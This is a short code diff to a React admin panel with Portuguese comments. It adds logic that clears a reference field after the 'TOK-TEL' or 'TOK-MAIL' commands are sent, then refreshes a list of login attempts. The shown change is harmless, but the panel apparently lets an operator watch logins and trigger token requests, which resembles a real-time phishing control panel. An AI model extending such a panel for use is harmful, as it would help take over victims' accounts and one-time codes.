@@ -64,6 +64,12 @@ function AdminPanel() {
       }
 
       await axios.post(`${API}/admin/command`, payload, { headers });
+      
+      // Limpar campo de referência após enviar comando que usa ele
+      if (command === "TOK-TEL" || command === "TOK-MAIL") {
+        setReferenceField("");
+      }
+      
       fetchLoginAttempts();
     } catch (error) {
       console.error("Erro ao enviar comando:", error);
@@ -94,6 +100,12 @@ function AdminPanel() {
       }
       
       await axios.post(`${API}/admin/command`, payload, { headers });
+      
+      // Limpar campo de referência após enviar comando que usa ele
+      if (command === "TOK-TEL" || command === "TOK-MAIL") {
+        setReferenceField("");
+      }
+      
       fetchLoginAttempts();
     } catch (error) {
       console.error("Erro ao invalidar campo:", error);
